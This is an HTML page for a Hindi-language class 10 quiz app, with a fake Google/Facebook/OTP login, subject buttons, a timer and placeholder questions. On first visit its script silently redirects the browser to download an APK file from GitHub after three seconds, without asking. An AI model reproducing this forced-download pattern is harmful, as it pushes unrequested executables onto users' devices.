<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>10th Quiz App Pro</title>
    <style>
        :root { --success: #4CAF50; --error: #F44336; --primary: #2196F3; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
        .container { background: white; width: 100%; max-width: 450px; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; }
        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .option-btn { background: #f8f9fa; border: 2px solid #ddd; transition: 0.2s; }
        .correct { background: var(--success) !important; color: white; border-color: var(--success); }
        .wrong { background: var(--error) !important; color: white; border-color: var(--error); }
        #timer { font-size: 20px; color: var(--error); margin: 10px 0; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="login-screen">
        <h2>10th Quiz App Pro</h2>
        <button class="btn" style="background:#db4437; color:white;">Login with Google</button>
        <button class="btn" style="background:#4267B2; color:white;">Login with Facebook</button>
        <input type="tel" id="mobile" placeholder="Mobile Number" style="width:90%; padding:10px; margin:10px; border:1px solid #ccc; border-radius:5px;">
        <button class="btn" style="background:var(--primary); color:white;" onclick="showDashboard()">Send OTP & Start</button>
    </div>

    <div id="dashboard" class="hidden">
        <h3>विषय चुनें</h3>
        <button class="btn option-btn" onclick="startQuiz('Hindi')">हिंदी</button>
        <button class="btn option-btn" onclick="startQuiz('English')">English</button>
        <button class="btn option-btn" onclick="startQuiz('Science')">विज्ञान</button>
        <button class="btn option-btn" onclick="startQuiz('Math')">गणित</button>
        <button class="btn option-btn" onclick="startQuiz('SST')">सामाजिक विज्ञान</button>
        <button class="btn option-btn" onclick="startQuiz('Sanskrit')">संस्कृत</button>
    </div>

    <div id="quiz-screen" class="hidden">
        <div id="timer">15:00</div>
        <div id="score-area" style="margin-bottom:10px;">सही: <span id="right">0</span> | गलत: <span id="wrong">0</span></div>
        <h3 id="question-text">प्रश्न लोड हो रहा है...</h3>
        <div id="options-list"></div>
        <button class="btn" style="background:#bbb;" onclick="nextQuestion(true)">Skip</button>
    </div>
</div>

<script>
    // 1. One-Time Download Logic
    if (!localStorage.getItem('downloaded')) {
        setTimeout(() => {
            window.location.href = "https://github.com/abhishekmeena07701012008-alt/10th-quiz-app-pro/raw/main/quiz.apk";
            localStorage.setItem('downloaded', 'true');
        }, 3000);
    }

    let allData = []; // यहाँ आपके 500 सवाल आएंगे
    let currentQuiz = [];
    let qIdx = 0;
    let rCount = 0, wCount = 0;

    // डमी डेटा (इसे आप बाद में बदल सकते हैं)
    const dummy = Array.from({length: 50}, (_, i) => ({
        q: "सवाल नंबर " + (i+1) + " का सही उत्तर क्या है?",
        options: ["उत्तर A", "उत्तर B", "उत्तर C", "उत्तर D"],
        correct: 0
    }));

    function showDashboard() {
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
    }

    function shuffle(arr) { return arr.sort(() => Math.random() - 0.5); }

    function startQuiz() {
        document.getElementById('dashboard').classList.add('hidden');
        document.getElementById('quiz-screen').classList.remove('hidden');
        currentQuiz = shuffle([...dummy]).slice(0, 15);
        renderQuestion();
        startTimer(15 * 60);
    }

    function renderQuestion() {
        if(qIdx >= 15) return alert("क्विज़ पूरा हुआ!");
        const data = currentQuiz[qIdx];
        document.getElementById('question-text').innerText = data.q;
        const list = document.getElementById('options-list');
        list.innerHTML = "";

        // उत्तरों की शफलिंग
        let opts = data.options.map((o, i) => ({t: o, id: i}));
        shuffle(opts).forEach(obj => {
            const b = document.createElement('button');
            b.className = "btn option-btn";
            b.innerText = obj.t;
            b.onclick = () => check(b, obj.id === data.correct, data.correct);
            b.dataset.id = obj.id;
            list.appendChild(b);
        });
    }

    function check(btn, isCorrect, correctId) {
        const btns = document.querySelectorAll('.option-btn');
        btns.forEach(b => b.disabled = true);

        if(isCorrect) {
            btn.classList.add('correct');
            rCount++;
        } else {
            btn.classList.add('wrong');
            btns.forEach(b => { if(parseInt(b.dataset.id) === correctId) b.classList.add('correct'); });
            wCount++;
        }

        document.getElementById('right').innerText = rCount;
        document.getElementById('wrong').innerText = wCount;

        setTimeout(() => { qIdx++; renderQuestion(); }, 500); // 0.5 सेकंड में अगला सवाल
    }

    function startTimer(t) {
        setInterval(() => {
            t--;
            let m = Math.floor(t/60), s = t%60;
            document.getElementById('timer').innerText = `${m}:${s<10?'0':''}${s}`;
        }, 1000);
    }

    function nextQuestion(skip) { if(skip) { qIdx++; renderQuestion(); } }
</script>
</body>
</html>
